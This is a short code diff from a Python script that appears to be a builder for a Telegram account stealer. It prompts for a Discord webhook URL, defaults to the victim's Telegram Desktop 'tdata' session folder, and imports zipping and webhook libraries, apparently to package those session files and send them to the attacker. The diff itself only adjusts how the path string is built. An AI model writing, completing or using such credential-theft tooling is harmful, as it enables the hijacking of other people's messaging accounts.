@@ -22,7 +22,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
 
-user = r'{user}' 
+user = os.path.join(home, {user}) 
 hook = "{hook}"
 # sources end
 
@@ -74,7 +74,7 @@ def main():
     hook = input("[Enter web hook url]: ")
 
 
-    default_user = r'home, AppData\\Roaming\\Telegram Desktop\\tdata'
+    default_user = r"'AppData\\Roaming\\Telegram Desktop\\tdata'"
     
 
     user = input(f"[Enter path to tdata or press ENTER for default path [{default_user}]]: ")
